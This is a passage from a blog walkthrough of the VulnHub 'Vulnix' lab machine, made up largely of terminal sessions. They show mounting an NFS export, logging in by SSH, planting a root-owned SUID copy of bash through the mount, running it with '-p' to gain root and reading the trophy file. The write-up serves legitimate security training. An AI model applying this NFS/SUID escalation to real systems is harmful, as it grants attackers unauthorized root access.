class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># showmount -e 192.168.159.5</span></span><br><span class="line">Export list <span class="keyword">for</span> 192.168.159.5:</span><br><span class="line">/home/vulnix *</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># mount -t nfs  192.168.159.5:/home/vulnix /mnt/home-vulnix </span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># cd home-vulnix</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/mnt/home-vulnix]</span><br><span class="line">└─<span class="comment"># ls -al</span></span><br><span class="line">total 28</span><br><span class="line">drwxr-x--- 4 vulnix vulnix 4096 Dec 19  2024 .</span><br><span class="line">drwxr-xr-x 4 root   root   4096 Dec 19 06:47 ..</span><br><span class="line">-rw------- 1 vulnix vulnix    0 Dec 19  2024 .bash_history</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc</span><br><span class="line">drwx------ 2 vulnix vulnix 4096 Dec 19  2024 .cache</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile</span><br><span class="line">drwxrwxr-x 2 vulnix vulnix 4096 Dec 19  2024 .ssh</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/.ssh]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa vulnix@192.168.159.5</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Thu Dec 19 20:55:15 GMT 2024</span><br><span class="line"></span><br><span class="line">  System load:  0.0              Processes:           89</span><br><span class="line">  Usage of /:   90.4% of 773MB   Users logged <span class="keyword">in</span>:     0</span><br><span class="line">  Memory usage: 7%               IP address <span class="keyword">for</span> eth0: 192.168.159.5</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; / is using 90.4% of 773MB</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">Last login: Thu Dec 19 20:33:34 2024 from 192.168.159.4</span><br><span class="line">vulnix@vulnix:~$ <span class="built_in">cp</span> /bin/bash suid_bash_shell</span><br><span class="line">vulnix@vulnix:~$ <span class="built_in">ls</span> -al</span><br><span class="line">total 2200</span><br><span class="line">drwxr-x--- 4 vulnix vulnix    4096 Dec 19 21:03 .</span><br><span class="line">drwxr-xr-x 4 root   root      4096 Sep  2  2012 ..</span><br><span class="line">-rw------- 1 vulnix vulnix       5 Dec 19 21:00 .bash_history</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix     220 Apr  3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    3486 Apr  3  2012 .bashrc</span><br><span class="line">drwx------ 2 vulnix vulnix    4096 Dec 19 20:18 .cache</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix     675 Apr  3  2012 .profile</span><br><span class="line">drwxrwxr-x 2 vulnix vulnix    4096 Dec 19 20:17 .ssh</span><br><span class="line">-rwxr-xr-x 1 vulnix vulnix  920788 Dec 19 21:03 suid_bash_shell</span><br><span class="line">vulnix@vulnix:~$ </span><br><span class="line">vulnix@vulnix:~$ <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">logout</span></span><br><span class="line">Connection to 192.168.159.5 closed.</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/.ssh]</span><br><span class="line">└─<span class="comment"># cd /mnt/home-vulnix               </span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/mnt/home-vulnix]</span><br><span class="line">└─<span class="comment"># ls -al </span></span><br><span class="line">total 2200</span><br><span class="line">drwxr-x--- 4 vulnix vulnix    4096 Dec 19  2024 .</span><br><span class="line">drwxr-xr-x 4 root   root      4096 Dec 19 06:47 ..</span><br><span class="line">-rw------- 1 vulnix vulnix     189 Dec 19  2024 .bash_history</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix     220 Apr  3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    3486 Apr  3  2012 .bashrc</span><br><span class="line">drwx------ 2 vulnix vulnix    4096 Dec 19  2024 .cache</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix     675 Apr  3  2012 .profile</span><br><span class="line">drwxrwxr-x 2 vulnix vulnix    4096 Dec 19  2024 .ssh</span><br><span class="line">-rwxr-xr-x 1 vulnix vulnix  920788 Dec 19  2024 suid_bash_shell</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/mnt/home-vulnix]</span><br><span class="line">└─<span class="comment"># cp suid_bash_shell suid_bash       </span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/mnt/home-vulnix]</span><br><span class="line">└─<span class="comment"># ls -al suid_bash</span></span><br><span class="line">-rwxr-xr-x 1 root root 920788 Dec 19  2024 suid_bash</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/mnt/home-vulnix]</span><br><span class="line">└─<span class="comment"># chmod u+s suid_bash         </span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/mnt/home-vulnix]</span><br><span class="line">└─<span class="comment"># cd ~/.ssh          </span></span><br><span class="line">    </span><br><span class="line">┌──(root㉿kali)-[~/.ssh]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa vulnix@192.168.159.5</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Thu Dec 19 21:05:02 GMT 2024</span><br><span class="line"></span><br><span class="line">  System load:  0.0              Processes:           89</span><br><span class="line">  Usage of /:   90.4% of 773MB   Users logged <span class="keyword">in</span>:     0</span><br><span class="line">  Memory usage: 8%               IP address <span class="keyword">for</span> eth0: 192.168.159.5</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; / is using 90.4% of 773MB</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">Last login: Thu Dec 19 20:55:15 2024 from 192.168.159.4</span><br><span class="line">vulnix@vulnix:~$ <span class="built_in">ls</span> -al</span><br><span class="line">total 1832</span><br><span class="line">drwxr-x--- 4 vulnix vulnix   4096 Dec 19 21:04 .</span><br><span class="line">drwxr-xr-x 4 root   root     4096 Sep  2  2012 ..</span><br><span class="line">-rw------- 1 vulnix vulnix    189 Dec 19 21:03 .bash_history</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    220 Apr  3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix   3486 Apr  3  2012 .bashrc</span><br><span class="line">drwx------ 2 vulnix vulnix   4096 Dec 19 20:18 .cache</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    675 Apr  3  2012 .profile</span><br><span class="line">drwxrwxr-x 2 vulnix vulnix   4096 Dec 19 20:17 .ssh</span><br><span class="line">-rwsr-xr-x 1 root   root   920788 Dec 19 21:04 suid_bash</span><br><span class="line">-rwxr-xr-x 1 vulnix vulnix 920788 Dec 19 21:03 suid_bash_shell</span><br><span class="line">vulnix@vulnix:~$ ./suid_bash -p</span><br><span class="line">suid_bash-4.2<span class="comment"># id</span></span><br><span class="line">uid=2008(vulnix) gid=2008(vulnix) euid=0(root) <span class="built_in">groups</span>=0(root),2008(vulnix)</span><br><span class="line">suid_bash-4.2<span class="comment"># cd /root</span></span><br><span class="line">suid_bash-4.2<span class="comment"># </span></span><br><span class="line">suid_bash-4.2<span class="comment"># ls -al</span></span><br><span class="line">total 84</span><br><span class="line">drwx------  4 root root  4096 Dec 19 20:30 .</span><br><span class="line">drwxr-xr-x 22 root root  4096 Sep  2  2012 ..</span><br><span class="line">-rw-------  1 root root    15 Dec 19 20:33 .bash_history</span><br><span class="line">-rw-r--r--  1 root root  3106 Apr 19  2012 .bashrc</span><br><span class="line">drwx------  2 root root  4096 Sep  2  2012 .cache</span><br><span class="line">-rw-r--r--  1 root root   140 Apr 19  2012 .profile</span><br><span class="line">-rw-------  1 root root    49 Dec 19 20:26 qterminal.pLWQPM</span><br><span class="line">-rw-------  1 root root   196 Dec 19 20:26 qterminal.uOPlrB</span><br><span class="line">-rw-------  1 root root 37648 Dec 19 20:26 qterminal.YgZWAM</span><br><span class="line">drwxr-xr-x  2 root root  4096 Dec 19 20:31 .ssh</span><br><span class="line">-r--------  1 root root    33 Sep  2  2012 trophy.txt</span><br><span class="line">-rw-------  1 root root   710 Sep  2  2012 .viminfo</span><br><span class="line">suid_bash-4.2<span class="comment"># </span></span><br><span class="line">suid_bash-4.2<span class="comment"># cat trophy.txt </span></span><br><span class="line">cc614640424f5bd60ce5d5264899c3be</span><br><span class="line">suid_bash-4.2<span class="comment"># </span></span><br><span class="line">suid_bash-4.2<span class="comment"># </span></span><br></pre></td></tr></table></figure>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>z9m8r8
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://z9m8r8.github.io/2024/12/19/HackLAB%20Vulnix/" title="VulnHub - HackLAB: Vulnix">https://z9m8r8.github.io/2024/12/19/HackLAB Vulnix/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/Vulnhub/" rel="tag"><i class="fa fa-tag"></i> Vulnhub</a>
              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
              <a href="/tags/SMB/" rel="tag"><i class="fa fa-tag"></i> SMB</a>
              <a href="/tags/Dirty-COW/" rel="tag"><i class="fa fa-tag"></i> Dirty COW</a>
              <a href="/tags/SUID-%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> SUID 提权</a>
              <a href="/tags/NFS/" rel="tag"><i class="fa fa-tag"></i> NFS</a>
              <a href="/tags/SMTP/" rel="tag"><i class="fa fa-tag"></i> SMTP</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/12/17/VulNyx%20-%20Hosting/" rel="prev" title="VulNyx - Hosting">
                  <i class="fa fa-angle-left"></i> VulNyx - Hosting
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/12/21/SickOs%201.2/" rel="next" title="VulnHub - SickOs: 1.2">
                  VulnHub - SickOs: 1.2 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2020 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">z9m8r8</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">359k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">21:47</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/fancybox.js"></script>

  <script src="/js/third-party/pace.js"></script>


  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/12/19/HackLAB%20Vulnix/"}</script>
  <script src="/js/third-party/quicklink.js"></script>

</body>
</html>
